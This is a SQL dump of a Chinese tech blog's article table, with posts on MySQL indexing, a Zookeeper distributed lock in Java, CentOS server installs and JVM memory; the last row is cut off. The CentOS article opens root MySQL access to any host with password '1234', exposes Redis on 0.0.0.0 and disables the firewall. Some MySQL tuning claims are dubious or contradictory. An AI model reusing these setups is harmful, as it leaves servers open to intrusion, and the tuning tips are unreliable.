INSERT INTO `article` VALUES (19, 1, 'Mysql索引原理与慢查询优化', '2018/8/1535357820_c8f0dd6681772b11a498172b260d1ea8.jpg', '## 概念\r\n### 基本概念\r\n#### 数据设计三范式\r\n1. 1F 原子约束,每列不可再分 \r\n2. 2F 保证唯一性,主键和orderNumber\r\n3. 3F 不要冗余数据\r\n\r\n#### MySQL常见引擎\r\n1. inndb-事务机制,支持外键,行锁\r\n2. myisam-批量添加,全文检索,表锁,需要定时清理假删除的文件optimize table 表名\r\n\r\n#### MySQL简单概括优化\r\n1. 表的设计合理化\r\n2. 添加适当索引(index)\r\n3. SQL语句优化\r\n4. 分表技术(水平分割、垂直分割)\r\n5. 读写[写: update/delete/add]分离\r\n6. 存储过程 [模块化编程，可以提高速度]\r\n7. 对mysql配置优化 [配置最大并发数my.ini, 调整缓存大小 ]\r\n8. mysql服务器硬件升级\r\n9. 定时的去清除不需要的数据,定时进行碎片整理(MyISAM)\r\n\r\n## 索引\r\n### 索引概念\r\n#### 为什么使用索引\r\n1. mysql官方对索引的定义为:索引是帮助mysql高效获取数据的数据结构\r\n2. 索引可以像书的目录一样快速定位到书的页码\r\n3. 如果向mysql发送一条sql语句,查询字段没有创建索引的话,可能会*导致全表扫描,这样的话查询效率非常低*\r\n4. 全盘扫描: 将整张表数据全部穷举扫描一遍,效率极低\r\n5. 满足*查询次数比较多,不是频繁更新的字段,值非常多不同*的字段适合加索引\r\n\r\n#### 索引优缺点\r\n1. 优点: 提高查询效率\r\n2. 缺点: 增加,删除需要更新索引文件\r\n\r\n#### 索引种类\r\n1. 添加*主键*索引: alter table 表名 add *primary key* (列名) \r\n2. 添加*唯一*索引: alter table 表名 add *unique* (列名)\r\n3. 添加*普通单列*索引: create *index 索引名* on 表名(列名)\r\n4. 添加*全文索引*: alter table 表名 add *FULLTEXT(name, title)*\r\n5. 添加*组合索引*: alter table 表名 add *index my_ind(name, title)*\r\n\r\n##### 使用全文索引: select * from article where match(name, title) against(\'你好\'),代替like\r\n##### 使用组合索引: select * from 表名 name=\'你好\',优化where\r\n\r\n### 索引原理\r\n#### 索引采用哪些机制\r\n1. *hash*: 通过字段的值计算hash值,定位数据非常快,但几乎无法做范围查询,因为数据机构是散列的,无法进行比较大小\r\n2. *平衡二叉树*: 平衡二叉树算法基本与二叉树查询相同,以左子树,右子树,效率比较高,支持范围查询,但插入操作需要旋转\r\n3. *b树*: 相对于平衡二叉树,B树一个节点下可以有多个节点,深度更小,使得效率更高\r\n4. *b+树*: 相对于b树,新增叶子节点与非叶子节点关系,通过非叶子节点查询叶子节点的值获得数据,通过链表结合,进行一定顺序排列,解决了范围查询(myisam和innodb都是采用b+树实现,myisam存放地址值,再获取数据,innodb直接存放数据)\r\n\r\n#### hash索引\r\n![mysqlcamhash.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555230272_mysqlcamhash.png)\r\n1. 散列表,是根据关键码值(key,value)而直接进行访问的数据结构,它通过把关键码值映射到表中一个位置来访问记录,以加快查找的速度,这个映射函数叫做散列函数hash(key),存放记录的数组叫做散列表\r\n2. 优点: 查找可以直接根据key访问\r\n3. 缺点: *不能进行范围查找,无法比较大小*\r\n\r\n#### 平衡二叉树索引\r\n![mysqlcamtwotree.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555230272_mysqlcamtwotree.png)\r\n1. 平衡二叉查找树,又称AVL树.它除了具备二叉查找树的基本特征,还具备一个非常重要的特点: 它的左子树和右子树都是平衡二叉树,且左子树和右子树的深度之差的绝对值(平衡因子)不超过1,也就是说AVL树每个节点的平衡因子只可能是-1,0,1(左子树高度减去右子树高度)\r\n2. 优点: 平衡二叉树算法基本与二叉树查询相同,效率比较高\r\n3. 缺点: *插入操作需要旋转,支持范围查询但效率低(深度太高,对IO性能造成影响)*\r\n\r\n#### B树索引\r\n![mysqlcambtree.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555230523_mysqlcambtree.png)\r\n1. 维基百科对B树的定义: B树是一种树状数据结构,他能够存储数据,对其进行排序并允许以O(log n)的时间复杂度运行进行查找,顺序读取,插入和删除的数据结构,B树,概括来说是*一个节点可以拥有多于2个节点的二叉查找树*,与自平衡二叉查找树不同,B树为系统最大化*大块数据的读和写操作*,B树算法减少定位记录时所经历的中间过程,从而加快存取速度,普遍运用在*数据库和文件系统*\r\n2. 优点: *因为B树节点元素比平衡二叉树要多*,所以B树数据结构相比平衡二叉树数据结构实现减少磁盘IO的操作\r\n3. 缺点: 尽管减少树的深度,也可进行范围查询,*但范围查询效率依旧很慢*\r\n\r\n#### B+树索引\r\n![mysqlcambtree.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560396834_mysqlcambtreeplus.png)\r\n1. B+树相比B树,*新增叶子节点与非叶子节点关系*,叶子节点中包含了key和value,非叶子节点中只是包含key,不包含value,*通过非叶子节点查询到叶子节点再获取对应的value*,所有相邻的叶子节点包含非叶子节点,使用链表结合,有一定顺序排序,从而范围查询效率非常高\r\n2. 优点: 继承B树特征,*范围查询因为叶子节点结合的链表使得效率非常高*\r\n3. 缺点: 因为有冗余节点数据,会比较占硬盘大小,但*以空间换时间是绝对值得的*\r\n4. myisam引擎和innodb引擎都是采用B+树实现,但有略微区别,*myisam存放地址值,再获取数据,innodb直接存放数据*\r\n\r\n#### 索引失效\r\n1. 索引无法存储null值\r\n2. 如果条件中有OR值,即使其中有条件带索引也不会使用(这也是为什么尽量少用OR的原因),除非给OR条件的每个列都加上索引,对于多列索引,不是使用的第一部分,就不会使用索引\r\n3. like以%开头不会使用索引\r\n4. 不以引号引用的字符串不会使用索引\r\n5. 如果全表更快不会使用索引\r\n6. 联合索引必须加入左前缀(第一个),否则不会使用索引,比如联合索引id+name,只查询name就不会使用索引,*因索引底层采用b+树叶子节点顺序排列,必须通过左前缀索引才能定位到具体的节点范围*\r\n\r\n## 优化\r\n### 慢查询\r\n#### 为什么是慢查询\r\n1. 缓慢的查询,性能导致影响正常业务\r\n2. MySQL默认10秒内没有响应SQL结果,则为慢查询\r\n\r\n#### 如何修改慢查询\r\n```sql\r\n--查询慢查询时间\r\nshow variables like \'long_query_time\';\r\n--修改慢查询时间\r\nset long_query_time=1; ---修改为一秒但是重启mysql之后，long_query_time依然是my.ini中的值,永久生效需要修改my.ini\r\n--显示慢查询次数\r\nshow status like \'show_queries\'\r\n```\r\n#### 如何定位慢查询\r\n1. 进入mysql根目录,找到慢查询日志\r\n2. 找到my.ini,修改日志文件位置: datadir=\"C:/ProgrameData/MySQL/MySQLServer5.7/Data/\"\r\n3. 关闭mysql并以日志模式启动bin\\mysqld.exe --safe-mode --slow-query-log\r\n4. 查看xxx-slow.log文件，其中所记录的就是造成慢查询的SQL语句\r\n\r\n#### 当前数据库状态\r\n```sql\r\n--mysql数据库启动花费多少时间\r\nshow status like \'uptime\'\r\n--显示mysql数据库的连接数\r\nshow status like \'connections\'\r\n--显示数据的查询,更新,添加,删除次数\r\nshow status like \'com [select|insert|update|delete]\'\r\n--session是当前窗口的执行次数,global是启动至此的执行次数\r\nshow [session|global] status like\r\n```\r\n### 执行信息\r\n#### 查询执行计划(信息)\r\n```sql\r\n--用于反映语句是否使用索引等信息\r\n--type: ref(使用索引) all(使用全盘扫描)\r\nexplain select * from ccc where name=\'a\'\r\n```\r\n#### 优化细节总结 \r\n1. 使用索引时,不要使用like\'%\'通配符开头,否则会全表扫描\r\n2. 使用OR,条件都必须加上索引,只要有一个条件不加索引,就不会使用索引\r\n3. IS NULL会使用索引,=NULL不会使用索引\r\n4. 使用GROUP BY分组不会使用索引,ORDER BY NULL可以禁止GROUP BY的排序\r\n5. 不要使用>=,会做两次全表扫描,直接使用>\r\n6. IN和NOT IN要慎用,否则会全表扫描.用between和exists代替IN\r\n7. 尽量使用连接代替子查询,子查询会造成额外的内存使用\r\n8. 查询量非常大时,使用缓存,分表,分页', 1, 0, 127, 0, 0, '2018-08-27 16:18:45', '2019-06-13 11:41:29', 0, 0);
INSERT INTO `article` VALUES (20, 1, 'Zookeeper协调者', '2018/8/1535442556_0d2e3a9d9fb049d0b3acf94f9d5b9e4c.jpg', '## 概念\r\n### 什么是zookeeper\r\n1. zookeeper是分布式协调工具,用于协调分布式的中间件\r\n2. 许多分布式框架所依赖的协调工具\r\n\r\n### 应用场景\r\n1. 注册中心,服务注册,服务发现\r\n2. 配置中心\r\n3. 发布订阅(watcher)\r\n4. 负载均衡\r\n5. 分布式通知\r\n6. 分布式锁\r\n7. master选举(主备投票机制)\r\n\r\n## zookeeper原理\r\n### zookeeper的结构\r\n![zkjg.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546580120_zkjg.png)\r\n1. xml树状存储结构,节点信息不允许重复,子节点信息无限递增\r\n\r\n#### 节点类型\r\n1. 持久节点: 永久保存在硬盘\r\n2. 持久顺序节点: 节点有顺序编号\r\n3. 临时节点: 声明周期绑定,连接断开时,节点直接删除\r\n4. 临时顺序节点: 节点有顺序编号\r\n\r\n#### 节点watcher\r\n1. 节点事件增删改查通知,节点连接,故障等通知\r\n2. 极其重要的功能,协调主要依靠watcher通知\r\n\r\n### 配置中心\r\n![zkconfig.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546584676_zkconfig.png)\r\n1. 节点的内容中包含配置信息\r\n2. 根据服务器所需环境不同读取不同配置信息\r\n\r\n### 负载均衡\r\n![zkregister.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546580791_zkregister.png)\r\n#### 使用场景\r\n1. 分布式框架duboo正是采用zookeeper作为注册中心作服务注册与发现\r\n2. 不同于SpringCloud,dubbo没有作像SpringCloud的ribbon作为负载均衡中间件\r\n\r\n### 选举策略\r\n![election.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546582742_election.png)\r\n#### 应用场景\r\n1. Redis集群中选举策略正式依靠zookeeper实现\r\n\r\n### 分布式锁\r\n![dlock.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546582866_dlock.png)\r\n1. zookeeper是分布式锁的最佳解决方案之一\r\n2. 临时节点与事件通知机制正是分布式锁的实现原理\r\n\r\n![zkdlock.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546582799_zkdlock.png)\r\n#### 应用场景\r\n1. 案例: 需要生成订单号,使用UUID+时间戳+业务id或雪花算法\r\n2. 线程并发安全问题,订单号在高并发的情况下会出现重复,所以需要分布锁保证原子性\r\n\r\n#### 分布式唯一订单号生成方案\r\n1. 使用分布式锁,此方法对性能有一定影响\r\n2. 使用Redis提前存储好预计所需订单数量,通过分布所调度任务实时检查Redis中预备订单号是否足够\r\n\r\n### 实现分布式锁\r\n#### 预计效果\r\n```java\r\n/**\r\n * 模拟生成订单号\r\n * 该orderService是多例的,目的是为了模拟应用集群\r\n * @author tuwq\r\n */\r\npublic class OrderService implements Runnable {\r\n\r\n	OrderNumberGenerator orderNumberGenerator = new OrderNumberGenerator();\r\n	\r\n	private Lock  lock = new ZkDistrbuteLock();\r\n	\r\n	public void run() {\r\n		try {\r\n			lock.getLock();// 加锁\r\n			this.getNumber();\r\n		} catch (Exception e) {\r\n			e.printStackTrace();\r\n		} finally {\r\n			lock.unLock(); // 释放锁\r\n		}\r\n	}\r\n	\r\n	public void getNumber() {\r\n		String number = orderNumberGenerator.getNumber();\r\n		System.out.println(Thread.currentThread().getName() + \"生成唯一订单号\" + number);\r\n	}\r\n	\r\n	public static void main(String[] args) {\r\n		for (int i = 0; i < 100; i++) {\r\n			new Thread(new OrderService()).start();;\r\n		}\r\n	}\r\n}\r\n```\r\n\r\n#### 总体流程\r\n```java\r\npublic abstract class ZkAbstractLock {\r\n\r\n	private static final String CONNECTSTRING = \"127.0.0.1:2181\";\r\n	protected ZkClient zkClient  = new ZkClient(CONNECTSTRING);\r\n	protected static final String PATH = \"/templock\";\r\n	protected CountDownLatch countDownLatch = null;\r\n	\r\n	public void getLock() {\r\n		// 尝试获取锁\r\n		if (this.tryLock()) {\r\n			System.out.println(\"获取锁成功\");\r\n		} else {\r\n			// 等待\r\n			this.waitLock();\r\n			// 重新获取锁\r\n			this.getLock();\r\n		}\r\n	}\r\n	\r\n	public void unLock() {\r\n		// 关闭连接,这样的话临时节点就会被删除\r\n		if (this.zkClient != null) {\r\n			zkClient.close();\r\n			System.out.println(\"关闭连接\");\r\n		}\r\n	}\r\n\r\n	abstract void waitLock();\r\n\r\n	abstract Boolean tryLock();\r\n	\r\n}\r\n```\r\n#### 尝试与等待\r\n```java\r\npublic class ZkDistrbuteLock extends ZkAbstractLock {\r\n\r\n	@Override\r\n	Boolean tryLock() {\r\n		try {\r\n			this.zkClient.createEphemeral(PATH);\r\n			return true;\r\n		} catch (Exception e) {\r\n			return false;\r\n		}\r\n	}\r\n	\r\n	@Override\r\n	void waitLock() {\r\n		// 使用事件监听,获取到节点被删除时的事件通知\r\n		IZkDataListener iZkDataListener = new IZkDataListener() {\r\n			// 当节点被删除时\r\n			public void handleDataDeleted(String dataPath) throws Exception {\r\n				if (countDownLatch != null) {\r\n					// 唤醒await\r\n					countDownLatch.countDown();\r\n				}\r\n			}\r\n			// 当节点被改变时\r\n			public void handleDataChange(String dataPath, Object data) throws Exception {\r\n				\r\n			}\r\n		};\r\n		this.zkClient.subscribeDataChanges(PATH, iZkDataListener);\r\n		if(this.zkClient.exists(PATH)) {\r\n			// 创建信号量\r\n			this.countDownLatch = new CountDownLatch(1);\r\n			try {\r\n				// 等待\r\n				this.countDownLatch.await();\r\n			} catch (Exception e) {\r\n				e.printStackTrace();\r\n			}\r\n		}\r\n		// 删除事件通知\r\n		this.zkClient.unsubscribeDataChanges(PATH, iZkDataListener);\r\n	}\r\n\r\n}\r\n```', 0, 0, 72, 0, 0, '2018-08-28 15:55:20', '2019-02-22 00:15:49', 0, 0);
INSERT INTO `article` VALUES (21, 1, 'centos安装jdk,mysql,nginx,redis', '2018/9/1535899296_92315b1e1ff4f42c9ae6dc9fb71efbdb.jpg', '### 安装jdk\n#### 下载\n链接：https://pan.baidu.com/s/1LtvSUvpmugz_6vh4ljhE-g \n提取码：wkta\n\n#### 安装\n![TIM截图20190528224147.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559399252_TIM截图20190528224147.png)\n![TIM截图20190528223938.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559399252_TIM截图20190528223938.png)\n```kotlin\n// 1. 修改/etc/profile\nvi /etc/profile\n\n// 添加以下内容\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$JAVA_HOME/bin:$PATH\n\n// 2. 重新读取文件\nsource /etc/profile\n\n// 3. 查看是否配置成功\njava -version\n```\n\n\n\n### 安装mysql\n![TIM截图20190527214355.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559050009_TIM截图20190527214355.png)![TIM截图20190527214716.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559050009_TIM截图20190527214716.png)\n```kotlin\n// 1. 先检查系统是否装有mysql\nrpm -qa | grep mysql\n\n// 2. 安装wget\nyum -y install wget\n\n// 3. 下载mysql的repo源\nwget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm\n\n// 4. 安装mysql-community-release-el7-5.noarch.rpm包\nsudo rpm -ivh mysql-community-release-el7-5.noarch.rpm\n\n// 5. 安装MySQL\nsudo yum install mysql-server\n\n// 6. /var/lib/mysql的访问权限问题\nchown root /var/lib/mysql/\n\n// 7. 重启mysql服务\nservice mysqld restart\n\n// 8. 接着登陆设置密码\nmysql -u root\nuse mysql;\nupdate user set password=password(\'1234\') where user=\'root\';\nexit;\n\n// 9. 重启mysql服务\nservice mysqld restart\n\n// 10. 接着设置Root账户远程连接密码\nmysql -u root -p\nGRANT ALL PRIVILEGES ON *.* TO root@\"%\" IDENTIFIED BY \"1234\";　\nexit;\n\n// 11. 重启mysql服务\nservice mysqld restart\n\n// 12. 使用外网工具连接MySQL,关闭防火墙\nsystemctl stop firewalld\n```\n\n### 安装Nginx\n![TIM截图20190613163837.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423166_TIM截图20190613163837.png)\n![TIM截图20190613164024.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423166_TIM截图20190613164024.png)\n![TIM截图20190613164052.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423166_TIM截图20190613164052.png)\n![TIM截图20190613164308.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423166_TIM截图20190613164308.png)\n![TIM截图20190613164350.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423166_TIM截图20190613164350.png)\n![TIM截图20190613163729.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560423165_TIM截图20190613163729.png)\n```c++\n// 1. 安装依赖\nyum install gcc-c++\nyum -y install pcre-devel\nyum -y install zlib zlib-devel\nyum -y install openssl openssl-devel\n\n// 2. 下载解压nginx\nwget http://nginx.org/download/nginx-1.12.0.tar.gz\ntar -zxvf nginx-1.12.0.tar.gz\n\n// 3. 编译安装nginx\ncd nginx-1.12.0\n./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module\nmake && make install \n\n// 4. 启动nginx\ncd /usr/local/nginx/sbin/\n./nginx\n```\n\n### 安装redis\n![TIM截图20190614180408.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509316_TIM截图20190614180408.png)\n![TIM截图20190614180746.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509316_TIM截图20190614180746.png)\n![TIM截图20190614181100.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509316_TIM截图20190614181100.png)\n![TIM截图20190614181925.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509317_TIM截图20190614181925.png)\n![TIM截图20190614181556.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509316_TIM截图20190614181556.png)\n![TIM截图20190614181721.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509316_TIM截图20190614181721.png)\n![TIM截图20190614181903.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509317_TIM截图20190614181903.png)\n![TIM截图20190614182500.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560509317_TIM截图20190614182500.png)\n```c++\n// 1. 下载redis\nwget http://download.redis.io/releases/redis-3.2.9.tar.gz\n\n// 2. 解压redis\ntar -zxvf redis-3.2.9.tar.gz\n\n// 3. 进入解压后源码src目录并make\ncd redis-3.2.9/src/\nmake install PREFIX=/usr/local/redis\n\n// 4. make成功后,将源码目录的redis.conf复制到生成redis的etc配置文件目录\nmkdir /usr/local/redis/etc\ncp ~/redis-3.2.9/redis.conf /usr/local/redis/etc/\n\n// 5. 修改redis.conf\ncd /usr/local/redis/etc/\nvi redis.conf\n// 修改内容\n// 后台启动redis\ndaemonize yes\n// 配置连接密码\nrequirepass 1234\n// 允许外部访问\nbind 0.0.0.0\n\n// 6. 启动redis\ncd bin\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 7. 测试连接redis是否正常运行,\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n\n// 8. 关闭防火墙\nsystemctl stop firewalld\n```', 0, 0, 132, 0, 0, '2018-09-02 22:45:10', '2019-06-15 22:25:32', 0, 0);
INSERT INTO `article` VALUES (22, 1, 'JVM内存结构与内存模型', '2018/9/1536377718_3820bd5a4a04cb806198482a52df82ad.jpg', '# 前言\n*JVM内存结构与内存模型是两个东西*,有文章会将这两个东西混为一谈,然且并不是这样的,JVM内存结构是虚拟机的运行区域有关,而JMM内存模型指的是并发编程相关的内容\n## JVM内存结构\n![javaramstruct.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545209777_javaramstruct.png)\n### 区域功能\n#### 堆\n1. java堆是java虚拟机所管理的内存中最大的一块，是被*所有线程共享的一块内存区域*，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，这一点在Java虚拟机规范中的描述是：*所有的对象实例以及数组都要在堆上分配*\n2. java堆是垃圾收集器管理的主要区域，因此也被成为“GC堆”（Garbage Collected Heap）\n3. 从内存回收角度来看java堆可分为：新生代和老生代\n4. 从内存分配的角度看，线程共享的Java堆中可能划分出多个线程私有的分配缓冲区（Thread Local Allocation Buffer，TLAB）\n5. 根据Java虚拟机规范的规定，java堆可以处于物理上不连续的内存空间中。当前主流的虚拟机都是可扩展的(通过 -Xmx 和 -Xms 控制).如果堆中没有内存完成实例分配,并且堆也无法再扩展时,将会抛出OutOfMemoryError异常。\n\n#### Java虚拟机栈\n1. java虚拟机栈也是线程私有的,它的生命周期和线程相同。\n2. 每个方法在执行的同时都会创建一个栈帧（Stack Frame）\n3. 栈帧用于存储局部变量表、操作数栈、动态链接、方法出口等信息\n\n#### 本地方法栈\n1. 本地方法栈与虚拟机栈所发挥作用非常相似,它们之间的区别不过是虚拟机栈为虚拟机执行Java方法(也就是字节码)服务\n2. 而本地方法栈则为虚拟机使用到的native方法服务。\n\n#### 方法区\n1. 方法区与java堆一样,是各个线程共享的内存区域\n2. 它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。它有个别命叫Non-Heap（非堆）\n\n#### 直接内存\n1. 直接内存不是虚拟机运行时数据区的一部分,也不是java虚拟机规范中定义的内存区域\n2. 但这部分区域也呗频繁使用，而且也可能导致OutOfMemoryError异常\n\n#### 运行时常量池\n1. 运行时常量池是方法区的一部分。\n2. Class文件中除了有类的版本、字段、方法、接口等描述信息外,还有一项信息是常量池,\n3. 用于存放编译期生成的各种字面量和符号引用，这部分内容将在加载后进入方法区的运行时常量池中存放。 \n\n#### 程序计数器\n1. 程序计数器是一块较小的内存空间，它可以看作是当前线程所执行的字节码的行号指示器。\n2. 由于Java虚拟机的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，一个处理器都只会执行一条线程中的指令。\n3. 因此,为了线程切换后能恢复到正确的执行位置,*每条线程都有一个独立的程序计数器*,各个线程之间计数器互不影响,独立存储。\n4. 程序计数器内存区域是虚拟机中唯一没有规定OutOfMemoryError情况的区域\n\n#### 执行引擎\n1. 虚拟机核心的组件就是执行引擎,它负责执行虚拟机的字节码,一般户先进行编译成机器码后执行\n\n#### 垃圾收集系统\n1. 垃圾收集系统是Java的核心,也是不可少的,Java有一套自己进行垃圾清理的机制,开发人员无需手工清理\n	 \n### 数据存储位置\n- 堆:*运行时*的数据区,垃圾回收负责,可以动态分配内存大小,不必告诉编译器(运行时动态分配内存,存取速度相对慢) \n- 栈:存取速度比堆要快,仅此于计算机中的寄存器(栈的数据是可以共享的,存在栈中的大小与生成期必须是确定的,缺少灵活性,栈中存放*基本类型的变量*) \n- [对象存放在堆上][调用栈和本地变量存放在线程栈上]\n- 一个本地变量,可能是一个指向对象的引用,这种情况下引用这个*本地变量存放在线程栈上*,但是*对象本身存放在堆上*\n- 一个对象可能包含方法,这些方法可能包含本地变量,这些*本地变量仍然存放在线程栈上*(即使这些方法所属的对象存放在堆上)\n- 一个对象的*成员变量*可能会*随着这个对象自身存放在堆上*(不管这个对象是原始类型还是引用类型) \n- 静态成员变量*跟随这类的定义一起存放在堆上*\n- 存放在堆上的变量可以被所持有对象引用的线程访问\n- 当一个线程可以访问一个对象的时候,它也可以访问这个对象的成员变量\n- 如果两个线程同时调用同一个对象的同一个方法,它们将都会访问这个对象的成员变量,但是*每一个线程都拥有这个成员变量的私有拷贝*  \n\n\n### JVM内存结构和硬件架构模型的一些关联\n![computerAndJVM.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544759160_computerAndJVM.png)\n#### JVM内存结构与硬件架构模型之间存在一些差异\n1. *硬件架构模型没有区分线程栈和堆*\n2. 对于硬件而言,所有的线程栈和堆都分布在主内存里面,部分线程栈和堆可能有时候出现在CPU缓存中和CPU寄存器\n\n### 主内存\n1. 一个计算机包含一个主存,所有的CPU都可以访问主存\n2. 主存通常比CPU的缓存大的多\n3. 通常情况下,当一个CPU需要读写主存的时候,它会将主存的部分读取到CPU缓存中,它甚至可能将部分内容读到它的内部寄存器当中\n4. 在寄存器当中执行操作,当CPU需要将结果会写到主存的时候,它会将内部寄存器的值刷新到缓存中,然后在某个时间点将值刷新回主存\n\n### CPU寄存器\n1. 每个CPU都包含一系列的寄存器,它们是CPU内存的基础\n2. CPU在寄存器上执行操作的速度远大于在主存上执行的速度,这是因为CPU访问寄存器的速度远大于主存\n3. 由于计算机的存储设备与处理器的运算速度之间有几个数量级的差距\n4. 所以现代计算机系统不得不加入一层读写速度接近处理器速度的高级缓存,来作为CPU与内存之间的缓冲\n5. 将运算需要用到数据的复制到缓存中,让运算可以快速的进行\n6. 当运算结束后,在从缓存同步回内存之中,这样处理器就无需等待缓慢的内存读写了,CPU访问缓存层快于访问主存的速度,\n7. 但通常高速缓存的速度相对于寄存器速度还是要慢一点\n 每个CPU会有一个CPU的缓存层,一个CPU还要多层缓存\n8. 在某一时刻,一个或多个缓存行可能被读到缓存,一个或多个缓存行可能在被刷新回主存\n\n\n### CPU多级缓存\n#### 为什么需要CPU cache  \n##### CPU的频率太快了,快到主存跟不上,这样在处理器时钟周期内,CPU常常需要等待主存,浪费资源,所以cache的出现,是为了*缓解CPU和内存之间速度不匹配问题*(结构:cpu->cache->memory) \n#### CPUcache有什么意义\n1. 时间局部性:如果某个数据被访问,那么在不久的将来它很可能*再次*被访问  \n2. 空间局部性:如果某个数据被访问,那么与它相邻的数据很快也可能被访问 \n\n### CPU保证缓存一致性(MESI)\n![TIM截图20180907131413.png](http://blog.img.tuwq.cn/upload/artimg/2018/9/1536378445_TIM截图20180907131413.png)\n1. 用于保证多个CPU cache之间缓存共享数据的一致\n2. 四个状态的速写\n\n \n- M(被修改)[数据与主存不一致,一定时间点会写回主存,写回后变为E状态]\n- E(独享)[只被缓存在该CPU的缓存中,未被修改过,与主存一致,被其他CPU读取变为S状态][当CPU修改该缓存行的内容时,变为M状态]\n- S(共享)[该缓存可能被多个CPU进行缓存,而且各缓存和CPU主存的数据是一致的][当有一个CPU修改该缓存行的时候,其他CPU从该缓存读取是作废的,变为I状态]\n- I(无效)[这个缓存是无效的,可能是其他CPU修改了该缓存行]\n\n\n1. 四个操作命令\n- localread: 读本地缓存中的数据\n- localwrite: 将数据写入本地缓存中\n- remoteread: 将内存中的数据读取过来\n- remotewrite: 将数据写回到主存之中\n\n## JMM内存模型\n![rammodel.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544759771_rammodel.png)\n![mesi.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570112320_mesi.png)\n1. 线程之间*共享变量存储在主内存里面*\n2. 每个线程都有一个*私有的本地内存*\n3. 本地内存是Java内存模型的一个抽象概念,它并不是真实存在的,它涵盖了缓存,写缓存区,寄存器以及其他硬件和编译器的优化\n4. 本地内存中*存储了该线程已读或已写变量拷贝的副本*\n5. 从更低的层次来说,主内存就是硬件的内存,是为了获取更好的运行速度\n6. 虚拟机使硬件系统可能会让*工作内存优先存储于寄存器和高速缓存中*\n7. Java内存模型中,线程的工作内存是CPU的寄存器和高速缓存的抽象描述\n8. JVM的静态内存存储模型它只是一种对内存的物理划分而已,它只局限在内存,而且只局限于JVM的内存\n9. 线程间通信,要求必须经过主内存,如果线程A和线程B之间需要通信,必须要经历下面两个步骤\n#####	线程A要把本地的内存A中更新过的共享变量刷新到主内存当中\n#####	线程B到主内存中去读写线程A之间已经更新过的共享变量\n\n### 同步的八种操作\n![jmmramstore.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544759809_jmmramstore.png)\n1. lock(锁定): 作用于主内存的变量,把一个变量标识为一条线程独占状态\n2. unlock(锁定): 作用于主内存的变量,把一个处于锁定状态的变量释放出来,释放后的变量才可以被其他线程锁定\n3. read(读取): 作用于主内存的变量,把一个变量值从主内存传输到线程的工作内存中,以便随后的load动作使用\n4. load(载入): 作用于*工作内存*的变量,把read操作从主内存得到的变量值放入工作内存的变量副本中\n5. use(使用): 作用于*工作内存*的变量,把工程内存中的一个变量值传递给执行引擎\n6. assign(赋值): 作用于*工作内存*的变量,把一个从执行引擎接收到的值赋值给工作内存的变量\n7. store(存储: 作用于*工作内存*的变量,把工作内存中的一个变量的值传送到主内存中,以便随后的write的操作\n8. write(写入): 作用于主内存的变量,它把store操作从工作内存中一个变量的值传送到主内存的变量中\n\n### 同步规则\n1. 如果要把一个变量从主内存中复制到工作内存,就需要按顺序地执行read和load操作,如果把变量从工作内存中同步回主内存中,\n就要按顺序地执行store和write操作.但Java内存模型只要求上述操作必须按顺序执行，而没有保证必须是连续执行\n2. 不允许read和load,store和write操作之一单独出现\n3. 不允许一个线程丢弃它的最近assign的操作,即变量在工作内存中改变了之后必须同步到主内存中\n4. 不允许一个线程无原因地(没有发生过任何assign操作)把数据从工作内存同步回主内存中\n5. 一个新的变量只能在主内存中诞生,不允许在工作内存中直接使用一个未被初始化(load和assgin)的变量,即就是对一个变量实时use和store操作之前,必须先执行过了assign和load操作\n6. 一个变量在同一时刻只允许一条线程对其进行lock操作,但lock操作可以被同一条线程重复执行多次,\n多次执行lock后,只有*执行相同次数的unlock操作*,变量才会被解锁,lock和unlock必须成对出现\n7. 如果对一个变量执行lock操作,将会清空工作内存中此变量的值,在执行引擎使用这个变量前需要重新执行load或assign操作初始化变量的值\n8. 如果一个变量事先没有被lock操作锁定,则不允许对它执行unlock操作,也不允许去unlock一个被其他线程锁定的变量\n9. 对一个变量执行unlock操作之前,必须先把此变量同步到主内存中(执行store和write操作)\n\n# 总结\n1. JVM内存结构和内存模型都与内存有关的\n2. JVM内存结构,和Java虚拟机的运行时区域有关\n3. JMM内存模型,和Java的并发编程有关\n4. 二者不能混谈', 2, 0, 148, 0, 0, '2018-09-08 11:35:34', '2019-10-03 